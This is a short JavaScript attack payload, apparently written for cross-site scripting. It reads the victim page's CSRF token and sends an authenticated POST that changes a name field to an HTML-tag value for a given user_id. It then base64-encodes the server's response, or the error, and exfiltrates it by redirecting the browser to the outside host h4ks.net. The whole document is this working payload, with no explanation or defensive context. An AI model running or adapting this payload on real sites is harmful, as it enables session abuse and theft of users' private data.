var csrf = document.getElementsByName('_csrf_token')[0].value;
fetch("/", {
    "credentials": "include",
    "headers": {
        "content-type": "application/x-www-form-urlencoded",
    },
    "method": "POST",
    "body": "name=jojo<s>&user_id=29&_csrf_token=" + csrf
}).then(r => r.text())
.then(body => {
    location = '//h4ks.net/go/?'+btoa(body);
})
.catch(err => {
    location = '//h4ks.net/go/?'+btoa(err.toString());
})
